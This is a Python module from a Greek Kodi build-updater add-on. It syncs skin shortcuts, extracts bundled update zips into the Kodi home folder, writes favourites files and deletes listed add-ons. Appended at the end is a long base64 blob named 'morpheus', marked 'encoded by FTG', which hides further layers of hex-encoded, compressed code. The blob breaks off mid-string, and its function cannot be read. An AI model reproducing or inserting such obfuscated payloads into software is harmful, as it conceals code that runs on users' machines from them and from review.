# -*- coding: utf-8 -*-
import xbmc, xbmcgui, xbmcvfs, xbmcaddon, os, hashlib, requests, shutil, sys, json, copy
from resources.lib import extract, addoninstall, addonlinks, notify, monitor, property_utils
from contextlib import contextmanager
addon = xbmcaddon.Addon()
addonid = addon.getAddonInfo('id')
addontitle = addon.getAddonInfo('name')
lang = addon.getLocalizedString
HOME = xbmcvfs.translatePath('special://home/')
USERDATA = os.path.join(HOME, 'userdata')
ADDOND = os.path.join(USERDATA, 'addon_data')
ADDONDATA = os.path.join(ADDOND, addonid)
EXTRACT_TO = HOME
BUILD_MD5S = os.path.join(ADDONDATA, 'build_md5s')
SHORTLATESTDATA = os.path.join(ADDONDATA, 'skinshortcuts_latest')
ADDONPATH = xbmcvfs.translatePath(addon.getAddonInfo('path'))
addonxml = os.path.join(ADDONPATH, 'addon.xml')
shortupdatedir = os.path.join(ADDONPATH, 'resources', 'skinshortcuts')
skinshortcutsdir = xbmcvfs.translatePath('special://home/userdata/addon_data/script.skinshortcuts/')
skinid = xbmc.getSkinDir()
skinhashpath = os.path.join(skinshortcutsdir, skinid+'.hash')
addonslist = addonlinks.ADDONS_REPOS
removeaddonslist = addonlinks.REMOVELIST

if not os.path.exists(BUILD_MD5S):
    os.makedirs(BUILD_MD5S)
if not os.path.exists(SHORTLATESTDATA):
    os.makedirs(SHORTLATESTDATA)

dp = xbmcgui.DialogProgressBG()
changelogfile = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'changelog.txt'))
changes = []
def percentage(part, whole):
    return 100 * float(part)/float(whole)

def versioncheck(new, old):
    a = new.split('.')
    b = old.split('.')
    if int(a[0]) > int(b[0]):
        return True
    elif int(a[0]) < int(b[0]):
        return False
    elif int(a[1]) > int(b[1]):
        return True
    elif int(a[1]) < int(b[1]):
        return False
    elif int(a[2]) > int(b[2]):
        return True
    elif int(a[2]) < int(b[2]):
        return False
    else:
        return False

def skinshortcuts(newdatapath=shortupdatedir, forcerun=False, skinreload=False, new_ver=addon.getAddonInfo('version')):
    # xbmcgui.Window(xbmcgui.getCurrentWindowId()).setProperty(addonid, "True")
    old_ver = addon.getSetting('shortcutsver')
    if old_ver == '' or old_ver is None:
        old_ver = '0.0.0'

    if forcerun == False:
        if versioncheck(new_ver, old_ver) == False:
            return

    if not os.path.exists(skinshortcutsdir):
        os.makedirs(skinshortcutsdir)

    dirs, files = xbmcvfs.listdir(newdatapath)
    total = len(files)

    if total == 0:
        addon.setSetting('shortcutsver', new_ver)
        return

    start = 0
    notify.progress('Ξεκινάει ο έλεγχος των συντομεύσεων')
    dp.create(addontitle, lang(30001))
    for item in files:
        if monitor.waitForAbort(0.2):
            dp.close()
            sys.exit()
        start += 1
        perc = int(percentage(start, total))
        if item.endswith('.hash'):
            skinhashpath = os.path.join(skinshortcutsdir, item)
            continue
        old  = os.path.join(skinshortcutsdir, item)
        new = os.path.join(newdatapath, item)
        dp.update(perc, addontitle, (lang(30001)+"...%s") % item)
        if matchmd5(old, new):
            continue
        if item.endswith('.xml') and addon.getSetting('keepmyshortcuts') == 'true':
            allshortcuts = []
            with xbmcvfs.File(old, 'r') as oldcontent:
                a_old = oldcontent.read()
                a_old = a_old.replace('<defaultID />', '<defaultID></defaultID>').replace('<label2 />', '<label2></label2>').replace('<icon />', '<icon></icon>').replace('<thumb />', '<thumb></thumb>')
                content = parseDOM(a_old, 'shortcut')
                disabledscuts = []
                bindexid = 0
                uindexid = 0
                for shortcut in content:
                    uscut = []
                    try:
                        defaultid = parseDOM(shortcut, 'defaultID')[0]
                    except:
                        defaultid = ""
                    try:
                        disabled = parseDOM(shortcut, 'disabled')[0]
                    except:
                        disabled = None
                    if defaultid.startswith(addonid) and not disabled == None:
                        disabledscuts.append(defaultid)
                        bindexid += 1
                        uindexid = 0
                        continue
                    elif defaultid.startswith(addonid):
                        bindexid += 1
                        uindexid = 0
                        continue
                    aa = format(bindexid, '02d')
                    bb = format(uindexid, '02d')
                    indexid = (aa+'.'+bb)
                    uindexid += 1
                    try:
                        label = parseDOM(shortcut, 'label')[0]
                    except:
                        label = ""
                    try:
                        label2 = parseDOM(shortcut, 'label2')[0]
                    except:
                        label2 = ""
                    try:
                        icon = parseDOM(shortcut, 'icon')[0]
                    except:
                        icon = ""
                    try:
                        thumb = parseDOM(shortcut, 'thumb')[0]
                    except:
                        thumb = ""
                    try:
                        visible = parseDOM(shortcut, 'visible')[0]
                    except:
                        visible = None
                    action = parseDOM(shortcut, 'action')[0]
                    uscut.append(indexid)
                    uscut.append('\n\t<shortcut>\n')
                    uscut.append('\t\t<defaultID>'+defaultid+'</defaultID>\n')
                    uscut.append('\t\t<label>'+label+'</label>\n')
                    uscut.append('\t\t<label2>'+label2+'</label2>\n')
                    uscut.append('\t\t<icon>'+icon+'</icon>\n')
                    uscut.append('\t\t<thumb>'+thumb+'</thumb>\n')
                    uscut.append('\t\t<action>'+action+'</action>\n')
                    if not visible == None:
                        uscut.append('\t\t<visible>'+visible+'</visible>\n')
                    if not disabled == None:
                        uscut.append('\t\t<disabled>'+disabled+'</disabled>\n')
                    uscut.append('\t</shortcut>')
                    allshortcuts.append(uscut)
            with xbmcvfs.File(new, 'r') as newcontent:
                a_new = newcontent.read()
                a_new = a_new.replace('<defaultID />', '<defaultID></defaultID>').replace('<label2 />', '<label2></label2>').replace('<icon />', '<icon></icon>').replace('<thumb />', '<thumb></thumb>')
                ncontent = parseDOM(a_new, 'shortcut')
                bindexid = 0
                for nshortcut in ncontent:
                    bscut = []
                    aa = format(bindexid, '02d')
                    indexid = (aa+'.a')
                    bindexid += 1
                    try:
                        defaultid = parseDOM(nshortcut, 'defaultID')[0]
                    except:
                        defaultid = ""
                    try:
                        disabled = parseDOM(nshortcut, 'disabled')[0]
                    except:
                        disabled = None
                    try:
                        label = parseDOM(nshortcut, 'label')[0]
                    except:
                        label = ""
                    try:
                        label2 = parseDOM(nshortcut, 'label2')[0]
                    except:
                        label2 = ""
                    try:
                        icon = parseDOM(nshortcut, 'icon')[0]
                    except:
                        icon = ""
                    try:
                        thumb = parseDOM(nshortcut, 'thumb')[0]
                    except:
                        thumb = ""
                    try:
                        visible = parseDOM(nshortcut, 'visible')[0]
                    except:
                        visible = None
                    action = parseDOM(nshortcut, 'action')[0]
                    bscut.append(indexid)
                    bscut.append('\n\t<shortcut>\n')
                    bscut.append('\t\t<defaultID>'+defaultid+'</defaultID>\n')
                    bscut.append('\t\t<label>'+label+'</label>\n')
                    bscut.append('\t\t<label2>'+label2+'</label2>\n')
                    bscut.append('\t\t<icon>'+icon+'</icon>\n')
                    bscut.append('\t\t<thumb>'+thumb+'</thumb>\n')
                    bscut.append('\t\t<action>'+action+'</action>\n')
                    if not visible == None:
                        bscut.append('\t\t<visible>'+visible+'</visible>\n')
                    if not disabled == None or defaultid in disabledscuts:
                        bscut.append('\t\t<disabled>True</disabled>\n')
                    bscut.append('\t</shortcut>')
                    allshortcuts.append(bscut)
            allshortcuts.sort()
            shortcuts_list = [i[1:] for i in allshortcuts]
            flat_list = [item for sublist in shortcuts_list for item in sublist]
            newxml = '<shortcuts>' + ''.join(flat_list)+ '\n</shortcuts>'
            with xbmcvfs.File(old, 'w') as f_new:
                f_new.write(newxml)
                changes.append(item)
        elif item.endswith('.properties') and addon.getSetting('keepmyskinproperties') == '1':
            notify.progress('Έλεγχος ρυθμίσεων για widgets-backgrounds')
            PROPLIST = property_utils.read_properties(new)
            PROPLIST=[elem for elem in PROPLIST if (elem[0] == "mainmenu")]
            USERPROPLIST = property_utils.read_properties(old)
            USERPROPLIST=[elem for elem in USERPROPLIST if (elem[0] == "mainmenu")]
            newpropslist = copy.deepcopy(PROPLIST)
            for props in PROPLIST:
                del props[3:]
            for prop in USERPROPLIST:
                checkprop = prop[:3]
                if not inproplist(PROPLIST, checkprop):
                    newpropslist.append(prop)
            property_utils.write_properties(newpropslist, old)
            changes.append(item)
        elif item.endswith('.properties') and addon.getSetting('keepmyskinproperties') == '0':
            notify.progress('Έλεγχος ρυθμίσεων για widgets-backgrounds')
            PROPLIST = property_utils.read_properties(new)
            PROPLIST=[elem for elem in PROPLIST if (elem[0] == "mainmenu")]
            USERPROPLIST = property_utils.read_properties(old)
            USERPROPLIST=[elem for elem in USERPROPLIST if (elem[0] == "mainmenu")]
            newpropslist = copy.deepcopy(USERPROPLIST)
            for props in USERPROPLIST:
                del props[3:]
            for prop in PROPLIST:
                checkprop = prop[:3]
                if not inproplist(USERPROPLIST, checkprop):
                    newpropslist.append(prop)
            property_utils.write_properties(newpropslist, old)
            changes.append(item)
        else:
            try:
                xbmcvfs.copy(new, old)
                changes.append(item)
            except:
                xbmcgui.Dialog().notification(addontitle, (lang(30002)+"...%s") % item, xbmcgui.NOTIFICATION_INFO, 1000, False)
                continue

    if len(changes) > 0:
        xbmcvfs.delete(skinhashpath)
    dp.close()
    addon.setSetting('shortcutsver', new_ver)
    if skinreload and len(changes) > 0:
        xbmc.executebuiltin('ReloadSkin()')
    notify.progress('Η ενημέρωση των συντομεύσεων ολοκληρώθηκε')
    return True


def updatezip():
    new_upd = addon.getAddonInfo('version')
    old_upd = addon.getSetting('updatesver')

    if old_upd == '' or old_upd is None:
        old_upd = '0.0.0'

    if versioncheck(new_upd, old_upd) == False:
        # xbmc.executebuiltin('UpdateAddonRepos()')
        return
    notify.progress('Ξεκινάει ο έλεγχος των zip ενημέρωσης')
    updatezips = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'resources', 'zips'))
    dirs, files = xbmcvfs.listdir(updatezips)
    totalfiles = len(files)

    if totalfiles == 0:
        addon.setSetting('updatesver', new_upd)
        # xbmc.executebuiltin('UpdateAddonRepos()')
        return

    zipchanges = []
    for item in files:
        if monitor.waitForAbort(0.5):
            sys.exit()
        if not item.endswith('.zip'):
            continue
        zippath = os.path.join(updatezips, item)
        newmd5 = filemd5(zippath)
        oldmd5file = xbmcvfs.translatePath(os.path.join(BUILD_MD5S, item+".md5"))
        if old_upd == '0.0.0':
            xbmcvfs.delete(oldmd5file)
        oldmd5 = xbmcvfs.File(oldmd5file,"rb").read()[:32]
        if oldmd5 and oldmd5 == newmd5:
            continue
        dp.create(addontitle, lang(30003)+"[COLOR goldenrod]"+item+"[/COLOR]")
        extract.allWithProgress(zippath, EXTRACT_TO, dp)
        xbmcvfs.File(oldmd5file,"wb").write(newmd5)
        changes.append(item)
        zipchanges.append(item)
        # xbmc.sleep(1000)
        dp.close()

    if len(zipchanges) > 0 and len(addonslist) > 0:
        addoninstall.addonDatabase(addonslist, 1, True)
        xbmc.executebuiltin('UpdateLocalAddons()')
    # xbmc.executebuiltin('UpdateAddonRepos()')
    addon.setSetting('updatesver', new_upd)
    notify.progress('Η ενημέρωση μέσω των zip ολοκληρώθηκε')

    if len(changes) > 0:
        while (xbmc.getCondVisibility("Window.isVisible(yesnodialog)") or xbmc.getCondVisibility("Window.isVisible(okdialog)")):
            xbmc.sleep(100)
        if os.path.exists(changelogfile):
            ok = xbmcgui.Dialog().ok(addontitle, lang(30004)+"[CR]"+lang(30005))
            if ok:
                textViewer(changelogfile)
        else:
            xbmcgui.Dialog().ok(addontitle, lang(30004))
        xbmc.executebuiltin('ReloadSkin()')
    return True


def SFxmls(newdatapath=shortupdatedir, forcerun=False, new_upd=addon.getAddonInfo('version')):
    old_upd = addon.getSetting('mainxmlsver')

    if old_upd == '' or old_upd is None:
        old_upd = '0.0.0'

    if forcerun == False:
        if versioncheck(new_upd, old_upd) == False:
            return
    notify.progress('Ξεκινάει η ενημέρωση SFxmls')
    xmllinks = [('19548.DATA.xml', 'Sports'), ('29958.DATA.xml', 'Kids'), ('29969.DATA.xml', 'Documentaries'),
                ('acestreams.DATA.xml', 'Acestreams'), ('a-i-o.DATA.xml', 'AllInOne'), ('ellenika.DATA.xml', 'Greek'),
                ('movies.DATA.xml', 'Movies'), ('music.DATA.xml', 'Music'), ('radio.DATA.xml', 'Radio'),
                ('replays.DATA.xml', 'Replays'), ('tvshows.DATA.xml', 'TV Shows'), ('worldtv.DATA.xml', 'WorldTV')]
    mainfolders = os.path.join(ADDONDATA, 'folders', 'Super Favourites')
    totalxmls = len(xmllinks)
    start = 0
    dp.create(addontitle, 'Ενημέρωση SFxmls')
    for item in xmllinks:
        if monitor.waitForAbort(0.2):
            dp.close()
            sys.exit()
        start += 1
        perc = int(percentage(start, totalxmls))
        skin_xml = os.path.join(newdatapath, item[0])
        folder_xml = os.path.join(mainfolders, item[1])
        dp.update(perc, addontitle, (lang(30001)+"...%s") % item[1])
        if not os.path.exists(folder_xml):
            os.makedirs(folder_xml)

        main_xml = os.path.join(folder_xml, 'favourites.xml')
        FAV_list = []
        with xbmcvfs.File(skin_xml, 'r') as xml:
            infos = xml.read()
            shortcuts = parseDOM(infos, 'shortcut')
            for shortcut in shortcuts:
                label = parseDOM(shortcut, 'label')[0]
                label2 = parseDOM(shortcut, 'label2')[0]
                if label.isdigit() is True: label = label2
                thumb = parseDOM(shortcut, 'thumb')[0]
                if thumb == '' or '<action>Ac' in thumb:
                    thumb = parseDOM(shortcut, 'icon')[0]
                else:
                    thumb = thumb
                action = parseDOM(shortcut, 'action')[0]
                if action.startswith('ActivateWindow(10025,"plugin://plugin.program.super.favourites'):
                    action = action.replace('ActivateWindow(10025,', 'RunPlugin(')

                newsf = '<favourite name="{}" thumb="{}" fanart="none">{}</favourite>'.\
                    format(label, thumb, action)
                xbmc.log('FAVOURITE: %s' % newsf)
                FAV_list.append(newsf)

        f_xml = []

        f_xml.append('<favourites>\n')
        for fav in FAV_list:
            f_xml.append('\t' + fav + '\n')

        f_xml.append('</favourites>')
        with xbmcvfs.File(main_xml, 'w') as outF:
            outF.write("".join(f_xml))

        # xbmcgui.Dialog().ok('SF XML CREATOR', 'NEW %s CREATED' % item[1])
    addon.setSetting('mainxmlsver', new_upd)
    notify.progress('Η ενημέρωση των SFxmls ολοκληρώθηκε')
    dp.close()
    return True

def addon_remover(lista=removeaddonslist, msg=True):
    for removeid in lista:
        if monitor.waitForAbort(0.5):
            sys.exit()
        try:
            addonfolderpath = os.path.join(HOME, 'addons', removeid)
            if os.path.exists(addonfolderpath):
                shutil.rmtree(addonfolderpath)
                xbmc.sleep(200)
                addoninstall.addonDatabase(removeid, 2, False)
                if msg:
                    xbmcgui.Dialog().notification(addontitle, "Αφαίρεση >> %s.." % removeid, xbmcgui.NOTIFICATION_INFO, 1000, False)
        except BaseException:
            if msg:
                xbmcgui.Dialog().notification(addontitle, "Αποτυχία απεγκατάστασης >> %s.." % removeid, xbmcgui.NOTIFICATION_INFO, 1000, False)
            continue
    xbmc.executebuiltin('UpdateLocalAddons()')
    return True


import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDc2NTY3NTUwMzY2YjcxNTg0YTY2NzEyYjcwNjYzMDY2NTA3MTZiNjY2NDcwNTczNjY0NGY1MTRjNWE0YjJiNTU1NDcyNTY2YjZjNmQzOTY4NDM0NTY4NmE2MzM3NTA3MTQyNjI3ODQ5NmI2Zjc2NDI3YTY5Mzk0YTYyNTAyZjM2NDg2ZDRkNDc2NTMxNjQzOTMxNjQ1NjQ4MzUzNjQ1NjY1NTY5N2E0MTQ0NmI2NjRkNzkzNTY4N2E1MjZmN2E0YTJiNmQzOTJmMzIzMTJmNGMzMjM2MmYzOTcyMzcyZjc0NzU3NDM5MmYyYjMyMzkyZjQzMmY1MDZmMzkzOTM5MmIyZjJiMzE1OTMxNjI2NjUwNzIzNzJmNzQ3NDZlMmY2Njc2Nzc3YTJiMzU1NzJiMzg2Zjc2N2EzNzM3MzczOTU2NzQzODJmMzY1OTMzMmYyZjJiMzkyZjJiMzk1NzM5MmY3MTQ3MzUzMDMyNTY1ODU0Mzc3OTRhNjE2ZTZjNTc1NTQ0NTAzMzMwNjQ2YzRhNDI3MzVhNjcyZjcyNGM0NzY2MzE3NjU2NzU1MDY2NmY3NTcyMmI2YzY4NTUzNDU2Mzk2YjU3MmI3Mzc5NjMyZjUyNzk3OTM2MzY0ODUwNDYzNjMyNmE2ZTdhNzkzODYyNTY2NjM4NjQzOTM5NTEzNzY2NjIzNTc4NGM2YTU4NzUyYjY0NmQzNzc5MzI0NTVhNGM3NTJiNzkzODU2MmY1NzdhNjQ0YjYyMzUyZjQ3NTA2MTZlMzkzMjcwNzYzNzQ2MzE0ODM3NmE1NDY2NTA0NzU5NTY3MDc0NjUyYjMyNTc3MjY1Mzk1NjUwNjMzMTdhNTQ0YzJiNzg3MDcyMzQ2NjU0NjE3NDQ1NTY3MDM4NTY1MTM5MzUzNTU0MzU0ZDU2NmM2ZDcwMzkzNzMzNTMyYjczNGI2NTJmN2E1NTMzNzU2MTRiMzA2NjMzNDc2ZDRmNmIyZjY2NTMzMDc3NDg2OTY1NzI2NjMxNDY0ZTJmNTU3ODY2NzIzNzcwNGQ0YjM0NmM3YTM0NzMzMjJmNjI1MzU4MmIyYjMyNzA1ODM1Nzk2ZDc2NzM2MTM0MzgzMjZmNjE0YjU3NjY1NDdhMzgyZjU0NTM3NjYzN2E1MDMzNTc2ZDcwMzU0Yjc2NDc0YjY2NmI2ZTM0NzY3NjM4NTQzNjcwMmI0OTc5NWE2YTM3NDU3MTVhNjU0ZDM1NmE3MTM2NTU1NTJmNmE0YzZhMzY2YjU0MzI1MDcyNTAyYjY1NjY3MDQ1NGU2NDYyNGY3NDY1NTA3MTU4MmY0MTYzMzA3NTczNDk2MzQ0Mzk3NTRjMzc0ODM4MmYzMjUzNzIzODM0NmQzMTMxNmE1MDQ3NTg0OTZmN2E2ODZhNDg3NzcwMzMzNDQ4NDc3MzJiNGM1MTYyNTQ0NTM5NWE3YTRiNmY2NTM2MzQ2ZTU2NmM2ODM4Mzg3ODU0N2EzMjU5Mzk2ZjY0NjU2ZTc5NDM1MDY2NmY0NjMxNjM2ODdhNGU1NjM0Nzk3YTM2NTQ2MTZlNzA0OTRiNjM3MjQ1NDkyYjU2Nzg3YTMzNGQ3MzU4NmU3NTRkMmI2YzU0NDc2MTJiNjg3Mjc3NGY3NTQxMzc1MDM4NDM0NTZlNjYzNDUwNzg0NjYyMzc0ODZlNDg0YzQ5MzI1MzM5NmMyZjRmNmI3MDRmNTc3MDVhNzgyZjc3Nzk1MDYxNTc1OTc4MmY1MDM5NTM2MjY0MzQ3ODY2MzE3YTZiNTE0Zjc1NzczMjc1NGE3YTM3NmQyYjY3MzQ1MDMxNDQ1MzY3MmY3OTRlNzY2OTRmNzY0NTM4NmE0NTZjMzUzNDJmMzc2NTYzMzc1NTM4NmUzODJiNjU0ODM2NDU0ODQ2MmY2NTMxNzU0ZTYxNDY2Njc1NTUyYjc5NDc3NTY3NGI2MTY0MzgyYjU1NDgzOTM0MmY2YjZlMzY0MTZlNTAyYjU5NTgzMzZkN2EyZjc0Nzc3OTZjNGYzMDQ2NzUzMDc3NTQ1MDQ2NjI3MjQyNjUyZjQ4NzM1NjU5NTA3YTc5NmY1ODc2NmY3YTc0MzgzNDdhMzM0ODc4NzY0MjUxNTM2NzZlMzU1MDZiNDU3NTJiNjE1ODQ1NTAzNTZjNmU0MTM3NjczNzU3NGE2ZjY2MzkzNTQyMzczMDZlNjczNDZmMzU3ODZlMzE2NDRlNzA0MTY0NmU2NzUwNmU1NzJmMzQyZjQyNTA3MzdhNDUzODM0NTgzODY2NDkyZjUxNDEzOTJmMmY3MTY3NTg2NTRhMzk0MjJmNmQzNTQ5Njk1MDRmNzg2NDYzNzQzOTYyMzc2ODYzMmY0ZjUzNjQ2YTRiNjM2ZTZhNDMyZjU4NTA1MTQyNjU2MzQzMmI2MzcyN2E3OTRmNTQ2ZTMxNzg0Zjc2MzU3OTc2NmMzNDQ2NzEzNzc2NGQ0MzM3MzA1NTYzNGIyYjVhNGQ3OTY4NTc1MjY2NmM2MzYzNDI3YTZmNDEyZjRiMzk2YzUzNjM1OTUyMzk1NzQ5NTgzNTc5NjQ2YTYxMzg2Njc4NTg0MTRjMzg3MTY1NjQ2YzM3NmIzOTQxNGUzODU0Njg3NTQyNzI1OTZkMmY1MjUwNzkzODc4NGM3MTZmMzU3NzMzMzA3MjQ4Njc2NjM3NDYzMjM1Mzg3NDc4NGI1MTc4Mzc2YzQxMmI0ZjM2NmY3MDM5NTQ2MTc2Nzc0NzJiNmY0ZTZkNDk0Nzc2NGQ0YTM2NjU2NjY5NTAzMjM3NmQ3MjU5NGIyYjM1Mzk0NzRiNTczMDQ4MmY3MjZjNzg1YTdhNmU2YjMwNTk3Njc2NTk1MDMzNjE0NTY2MzE0NjU3NmQ3NzY0MzgzODUzMzY3NTU4MzY3NTQyMzM1OTRiNmU1NTQ4MmY3MzQ4NTA1OTUwMmIzMjcxNTgzMjQyMzkzODRhNjQ1NjQxNGEzMTcwNTIzOTU5NzYzOTZlNjY0MTRmNmQ1NzM5NjU0MTM3NjU2MzdhNWEzODUyNjg1ODQ5Mzg3YTQyNzYyYjY4NDg3NDZjNzY2MjMwNmY0YTMxNjg0ODRkNzg1MDc3NjQzNDc4NGMzODc4NTg2Mzc4MzM3NzRhMzk2ODRhNDIzMzZlNDQ1ODMyNDUyZjU3NDQ2NjU4NjczMzZjNDI1ODM3NTE3NDU5Njc2YTU4NzY2MTQ1NjM2NzQ0NzM2NTMxN2E3OTQxNjY2MzQzNTc1OTU4NjUzNDQ0NzY0Yzc1NzU0NjM3NTk2MTU1NzQzNzMyNDg0MzM4NDUyYjU5Njg2NTc0MzI0OTMzNTc0YzY1NmM3NTY3Njg3MDJiNzc3ODUwMzk2OTZlNzA3NDJiNjU3ODRmMzc0Zjc2NGIyZjc3NzE2NDczN2EzNzVhNTQyYjY4NGY2NTZlNzQ0NzU4NTk0MTU4NDY0YzY5NTczMzUxNmU2ZDQzNjY3NjYxNzk2ZTU0Nzk0NTU0MzI0OTZjNTA3NjQ0Njg0MTcyMzU1MjYyNjk2Njc2NmY1Mzc4NzI3MjU0NDc2YjMzMzk0YjczNGMzOTQ5MzMzNzJiNjQ3OTdhNTEyZjdhNjk2MTMwNDgzOTUyNjk2ZTZlNjU2MzRhMzQ0Njc2NTY0Mzc2NDM2YzM4MzI3NjQ1NWEzOTM4NGQyYjY2NGM0NTM3MmI0MzQ3NzY0YjJiNDM3NjQzMmY2ZjM1MzU2ODc1MzQ0OTY3MmY2MzRjN2EzNjQ5Mzk2MzRlMmI2ODM5NGQ2MzM4MzQ0NDY0MzAzMzM0MzMzOTRjMzk3MTUxNTQ3OTQ4NzYzNjU5NDc2YjM3Njc2NTc2MzY2NzY3NTAyZjZhNDYyZjQ1NGMzOTdhNmQ0MzRjMzQ3MjJmNzc0NDYzNDY0YzJiNTI3ODc5N2E1MjYzNzUzNzU2NzY3YTRmNWE0MzMzMzI0NjcwNDY2NjM5NmM3Nzc2NWE0MTMzNWE0NTZlMzc2ODZlMmI0YzYyNjM0NDJmNzg1OTM2NGE3MjM3NTI0MjdhNDI1NzM0NTE3NDc5NmUyZjMyNDg2NTc1NDQzNDJmNTU0OTM0NzQzOTQ5NGU1ODM0NzQ3MTVhNjQ2NzY5Mzc0YTQ1Mzc3YTUwNzU2ZjRlNTk3YTZiNDI1MDc1NjUzODY5NjQ1MDUxNGIzMzQxNGU2MzcxNjQ2NTczNjIzNTUzNTk2Nzc4Nzc0MTMzMzYzODM0NGM2ZjM3NTg0MTUwMmY3NzU4MzIzODc2NzQ2MzUwNzk3MDQ4NTg2MzQyMzEzNDQ4NjQ0NDc2Njc2MTMxMzQ0YzZhNDc1NjM5NmI0OTY0NTE3NTM4MmIzMTc3NGYzNTU5NjYzNDU5NDQzMzUwNDMzOTU0NmUzODc3NDQyZjQ0Mzc3YTU4NTg0MjM3NzY2YTMyNmQ2YTQ4NTc3NjQyNjI0NTM2MmY2NzYxMmY1MjY4MzY0MTY0MzI2ZTZjNmY2OTQ4Mzk2ZjY4NjI0NTdhN2E2NTcwMmYzNDc3MmIyZjUwNzg0Njc0NGM2MzRlNzA1MDYxNTQzODc1NjM1OTM4MzQ3YTQ4NmE0YjU3NDE3MDM5NTk1ODM2NTU2NDU4NDU2YjM3NmIzMDZjMzc2OTMzNmY0ODJmNTIzMTMyNDI3NDc3NGM2YTM5Nzc2ZTcwNTE1ODUwNjc2NTc1MmI0MTY2NDc1ODU5Nzg1MDY2MzI1MDczMzQ2ZTc2NGY1MDM3NDI2ZDYzNmEzMzc4NmQ1ODM3NDQ0ZjUzNTA3NTZlNTc0NDJmNzg0ODdhNzg0MjM4NWE0MjJiNDQ3NjZhNTc1NTU3NjM3NzQ4NTcyYjRkNzY0NzU3NGQ3MTUzMzkzMDYxNTk1MTU4N2E0MTc1Mzk0ZDY1NTk0MjRjNmQ2NTYxNDI2MzQ4Nzc1Mzc1NGE2ZTYzNTI2Njc4NDgzMzY5NGM2NTRmNTU1MDZiNDU3NTRhMzg2NzVhMzg1MjUwNmE3NTQ5NDk3MjQ1NmMyYjQyNjE3OTc2NDc0NDM4NzI3Mzc3NGY2NDYyNzM0NjY2NGI0NjY2NmYzODc3MzkzNTY3NDk3OTQ5NzYyYjQ0NTA3MzU5NDU3MjM4NDU3YTZlNDQ2MjMzNzY0MjRjNDY3NjY5NTA2YzM4NWE0NzMzNzI2OTQyNGYzMDU1MzQ3YTRhNjU2MzZhMzc0NTUwMzg0NTU0MzY2Zjc2N2E3NzZlMzI1NTQyMmI3ODQ3NjMzMTdhMzY3MTcyNzk1NzM5NDYyZjQ5NGY2ZDU1NjU0MTU2Nzk1NTc1NDQ3NTY3NjYzODc5NDk1MDdhNmU3MzY4NmU0ODU0NGEzMjM3NDQ2YTZhNDI0Zjc3NTI2NzRkNTg2MzRiMzY0YzY0NzA3ODYzNjE0YzJmNGI3NTU5NTY1MTJiNzE3NjQ1NDY3NTUxNjU0ODYyNmI2NTZmNDI3NjQ1NzEzOTY3MmYzODQyMzEzNDQyNmUzOTZlNGU2ODZhMzQ3MTc2NDY0ZjQzNjIzNDY1MzI0YTRkMzU2YTdhNzA2YzM1NzAzNDM0MzA2OTYzNmI0ZTY5NzM3ODY1MzU2Nzc2MzM2NzU3NmU3NTRmNDk0ODQ0NzYzNjQzNzYzMDUzMzgzNjUzNjM2ZjUzNjY2ZDQ4Mzg0MzRjNmIzODc5NDQ2NjZmNGMzNTRkMmYzNTM3NmQ0NTY0NGE3NjQ4NTY0ZTY2Njg1MjU5NWE2NzM2NGQ2ODM1NDI0YzcwNDUzMjY1NWE3NjUyNGUyYjU0NTA1MDM0NDg3MjYzNWEzMTc5MzI0YTU2NTk0MTZjNzc3MjRiNGQ3OTRiNGY3NzQ0MmY3YTRkMmI1MTQ2NGY1YTMwMzI3ODY4MmI2ODcyMzQzMzZmNDc3YTY4MzA1MTY4MzY0ODJmNDEzMzM2Mzc1MzU2NjYzODQxNzY0MjRlNjU1OTQ0NzM0NDY2NTkzMDVhMzkyYjUxNDI2YjczNTg1MDQ3NzI2OTc2NTk0OTRmMzI0MTM4NTI1NDc5NTM0NzRmNTU3YTY4MzE0ODZkNzY2YTc5Njc1ODUyMzQ1YTM5MzI2YjMzNTc3NTc5NDI2MzY1NzE0ZDMxMzQ1ODQ1NGI2NjZmNTAyZjUyNGM2NjRkN2EzNDM0Nzg0ODMzNzg0ZDJiNDM2ZTM0NDI1NDMxNTU2MzQ4NjY2NzVhMzkzODY4NjEzNzY4NzYzNDQ4MzQ0MTc1NTU0YjQ3NTY0YTc1NzQ3NDY5NTMzNDQ5NTg0YTU5NjM1MzJmNjk1NTM4NmUzNDQ3NTU2YzRmNmU0OTVhNGEzNjYyMzAyZjc4NGUzOTZlNTA0NzRkNGQ1YTZhMzI1MTZlN2E1MzdhNDEyYjY3NGUzODU5NTA3ODU4Njc2YzJiNjE2OTU3NzU0NTM4NjM3MDJmMzM3NzY2NmIzMTM3NzczNzcxNWE0MjM2NjU1MTRhMmI0YzQ1Njk1ODM1NGYyZjMyNTEzODRlNjUzODMxMzgzMDUwNzE2YTY2NmE2YzQ4Nzg3YTZkNTczNDc3MzMyYjczNTMzNDc3MzM2YTQ5NTA0YTZkNzk3ODcwNmY2OTczNTc2ZDU0NGE3OTQ1NTg2ZjY2MzM0ZjRhNGEzNDY0NTI0MTM2NGQ1MjJiNWEzNjVhNjY0YTRmMzU3NTRmMzA1MTM4NmQyZjM2NGI2NDZlMzM3NTczNTM1NDM2NjI3OTU4NGQ2OTY2NjM1MTY4MmI3ODZlNmE0OTJiMzA1NzRmNjYyYjRhNjY2YzQ0Mzc2YzQ1NDQ0MjUwNjc0NDMwNzI3MjQyMmY1ODRkMzA2NTU4MmY0YjQzNmI2NjU2NzU1MzQ2MzU3YTY3Nzg3YTRhNmUzNDY3NzI3MjY3NGE1MjU5NjE1OTZkNTA1MTQ5MmY3NzU0Mzg2OTYzNjU1NDZlNzg0MzUwNmI3ODM2MzQ0MzRiNzU2ZDUyMmIzNTZkNDY2MzcyNmY2NjM1NDg3NTY0NGU0ZjMyNTY2NTcxNmU3MTcwNTAzNDZhNWE0YTM2MzY3NjRlNDg2ZDZmNTQzMzc1NDg3NjY4NDM1ODRhNGQ2NjRlNTA2MzZkNjg0ZTY2NTg1MTdhN2EzODZiNzY2YTQ5NjY3YTM1NmI1MDU5NmEzNjc5NGM3NDY5MzkzNDQyNWEzOTZjNzY2ZDY4NmM3NjZiNTU2NzZlNDc2YzRhNTg1OTRhMzM2MzM1NmY2NDc4NDg0NzRhNTgzNDUzNDYzNTJmNzg0MjQ4NjgzODZjNGM2OTY1Mzg3YTM1NGU2NjRjNGY0YTZjMzg0MTU2MzI2NzY2Mzg0NzY2NGM0NjY